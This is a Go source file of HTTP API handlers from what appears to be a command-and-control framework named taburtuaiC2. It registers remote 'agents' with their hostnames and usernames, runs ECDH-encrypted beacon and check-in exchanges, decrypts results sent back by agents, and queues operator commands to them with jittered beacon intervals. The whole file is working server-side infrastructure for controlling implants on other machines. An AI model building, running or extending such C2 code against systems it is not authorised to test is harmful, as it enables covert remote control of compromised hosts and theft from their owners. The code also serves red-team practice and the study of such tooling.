package api

import (
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/mjopsec/taburtuaiC2/internal/services"
	"github.com/mjopsec/taburtuaiC2/pkg/crypto"
	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

// ListAgents returns all registered agents
func (h *Handlers) ListAgents(c *gin.Context) {
	agents := h.server.Monitor.GetAllAgents()

	var agentList []map[string]any
	for _, agent := range agents {
		agentList = append(agentList, map[string]any{
			"id":        agent.ID,
			"hostname":  agent.Hostname,
			"username":  agent.Username,
			"os":        agent.OS,
			"status":    agent.Status,
			"last_seen": agent.LastSeen,
		})
	}

	h.APIResponse(c, true, "", map[string]any{
		"agents": agentList,
		"total":  len(agentList),
	}, "")
}

// GetAgent returns specific agent details
func (h *Handlers) GetAgent(c *gin.Context) {
	agentID := c.Param("id")
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	h.APIResponse(c, true, "", agent, "")
}

// RemoveAgent removes an agent
func (h *Handlers) RemoveAgent(c *gin.Context) {
	agentID := c.Param("id")
	h.server.Monitor.RemoveAgent(agentID)
	h.APIResponse(c, true, fmt.Sprintf("Agent %s removed", agentID), nil, "")
}

// AgentBeacon is the combined beacon endpoint (B1 — single request per cycle).
//
// Replaces the old Checkin + GetNextCommand + SubmitResult triplet with one POST.
// The agent sends: {id, hostname, ..., last_result: {...}, ecdh_pub: "..."}
// The server returns: {config, command: {...}|null, ecdh_pub: "..."}
func (h *Handlers) AgentBeacon(c *gin.Context) {
	agentID := c.Param("id")
	if !isValidUUID(agentID) {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid agent ID")
		return
	}

	body, err := c.GetRawData()
	if err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Failed to read body")
		return
	}

	// Decrypt if payload is wrapped with a session key
	if sessionMgr := h.agentSessionMgr(agentID); sessionMgr != nil {
		var wrapper struct {
			EncryptedPayload string `json:"encrypted_payload"`
		}
		if json.Unmarshal(body, &wrapper) == nil && wrapper.EncryptedPayload != "" {
			if dec, err := sessionMgr.DecryptData(wrapper.EncryptedPayload); err == nil {
				body = dec
			}
		}
	} else if h.server.CryptoMgr != nil {
		var wrapper struct {
			EncryptedPayload string `json:"encrypted_payload"`
		}
		if json.Unmarshal(body, &wrapper) == nil && wrapper.EncryptedPayload != "" {
			if dec, err := h.server.CryptoMgr.DecryptData(wrapper.EncryptedPayload); err == nil {
				body = dec
			}
		}
	}

	var payload map[string]any
	if err := json.Unmarshal(body, &payload); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid beacon payload")
		return
	}

	// ── ECDH key exchange (same as Checkin) ──────────────────────────────────
	var serverECDHPub string
	if agentPubB64, ok := payload["ecdh_pub"].(string); ok && agentPubB64 != "" {
		if session, err := crypto.NewECDHSession(); err == nil {
			if sessionKey, err := session.DeriveSessionKey(agentPubB64); err == nil {
				serverECDHPub = session.PubKeyB64
				payload["_session_key"] = encryptSessionKey(h, sessionKey)
			}
		}
		delete(payload, "ecdh_pub")
	}

	// ── Process last_result if present ───────────────────────────────────────
	if rawResult, ok := payload["last_result"]; ok && rawResult != nil {
		delete(payload, "last_result")
		if resultBytes, err := json.Marshal(rawResult); err == nil {
			var result types.CommandResult
			if err := json.Unmarshal(resultBytes, &result); err == nil && isValidUUID(result.CommandID) {
				if result.Encrypted {
					decMgr := h.agentSessionMgr(agentID)
					if decMgr == nil {
						decMgr = h.server.CryptoMgr
					}
					if decMgr != nil {
						if result.Output != "" {
							if dec, decErr := decMgr.DecryptData(result.Output); decErr == nil {
								result.Output = string(dec)
							}
						}
						if result.Error != "" {
							if dec, decErr := decMgr.DecryptData(result.Error); decErr == nil {
								result.Error = string(dec)
							}
						}
						result.Encrypted = false
					}
				}
				h.server.CommandQueue.CompleteCommand(result.CommandID, &result) //nolint:errcheck
			}
		}
	}

	// ── Update agent registration (heartbeat) ────────────────────────────────
	if _, exists := payload["id"]; !exists {
		payload["id"] = agentID
	}
	if err := h.server.Monitor.RegisterAgent(payload); err != nil {
		h.server.Logger.Error(services.SYSTEM, "RegisterAgent: "+err.Error(), agentID, "", nil)
	}
	h.server.Logger.LogAgentConnection(agentID, "beacon", c.ClientIP())

	// ── Get next pending command ──────────────────────────────────────────────
	nextCmd := h.server.CommandQueue.GetNext(agentID)

	// Build response
	resp := map[string]any{
		"config": map[string]any{
			"interval": 30,
			"jitter":   0.3,
		},
	}
	if serverECDHPub != "" {
		resp["ecdh_pub"] = serverECDHPub
	}

	if nextCmd != nil {
		if sessionMgr := h.agentSessionMgr(agentID); sessionMgr != nil {
			if cmdJSON, err := json.Marshal(nextCmd); err == nil {
				if enc, err := sessionMgr.EncryptData(cmdJSON); err == nil {
					resp["command"] = map[string]any{"encrypted": enc}
				}
			}
		} else {
			resp["command"] = nextCmd
		}
	}

	h.APIResponse(c, true, "ok", resp, "")
}

// AgentCheckin handles agent check-in with optional ECDH key exchange.
//
// ECDH flow:
//  1. Agent sends its ephemeral P-256 public key as "ecdh_pub" (base64)
//  2. Server generates its own ephemeral key pair, derives the shared AES key,
//     stores it in the agent's metadata, and returns its public key
//  3. Both sides now share the same AES-256 session key for subsequent traffic
func (h *Handlers) AgentCheckin(c *gin.Context) {
	var checkinData map[string]any
	if err := c.ShouldBindJSON(&checkinData); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid checkin data: "+err.Error())
		return
	}

	// Decrypt if payload is wrapped
	if enc, ok := checkinData["encrypted_payload"].(string); ok && h.server.CryptoMgr != nil {
		decrypted, err := h.server.CryptoMgr.DecryptData(enc)
		if err != nil {
			h.server.Logger.Error(services.SYSTEM, "Failed to decrypt checkin: "+err.Error(), "", "", nil)
			c.Status(http.StatusBadRequest)
			h.APIResponse(c, false, "", nil, "Failed to decrypt checkin data")
			return
		}
		var plain map[string]any
		if err := json.Unmarshal(decrypted, &plain); err != nil {
			c.Status(http.StatusBadRequest)
			h.APIResponse(c, false, "", nil, "Failed to parse decrypted data")
			return
		}
		checkinData = plain
	}

	// ── ECDH key exchange ─────────────────────────────────────────────────────
	var serverECDHPub string
	if agentPubB64, ok := checkinData["ecdh_pub"].(string); ok && agentPubB64 != "" {
		session, err := crypto.NewECDHSession()
		if err == nil {
			sessionKey, err := session.DeriveSessionKey(agentPubB64)
			if err == nil {
				serverECDHPub = session.PubKeyB64
				// Persist session key encrypted with server static key (never plaintext at rest)
				checkinData["_session_key"] = encryptSessionKey(h, sessionKey)
			} else {
				h.server.Logger.Warn(services.SYSTEM, "ECDH derive failed: "+err.Error(), "", "", nil)
			}
		} else {
			h.server.Logger.Warn(services.SYSTEM, "ECDH session create failed: "+err.Error(), "", "", nil)
		}
		// Remove the public key from checkin data so it isn't stored as agent field
		delete(checkinData, "ecdh_pub")
	}

	// Register / update agent
	if err := h.server.Monitor.RegisterAgent(checkinData); err != nil {
		h.server.Logger.Error(services.SYSTEM, "RegisterAgent failed: "+err.Error(), "", "", nil)
	}

	agentID, _ := checkinData["id"].(string)
	hostname, _ := checkinData["hostname"].(string)
	h.server.Logger.LogAgentConnection(agentID, "checkin", c.ClientIP())

	// Broadcast checkin event to all connected operators
	h.server.TeamHub.Broadcast(services.TeamEvent{
		Type:    "agent_checkin",
		AgentID: agentID,
		Payload: fmt.Sprintf("%s checked in from %s", hostname, c.ClientIP()),
		Time:    time.Now().Format(time.RFC3339),
	})

	response := map[string]any{
		"status": "ok",
		"config": map[string]any{
			"interval": 30,
			"jitter":   0.3,
		},
	}
	if serverECDHPub != "" {
		response["ecdh_pub"] = serverECDHPub
	}

	h.APIResponse(c, true, "Checkin successful", response, "")
}
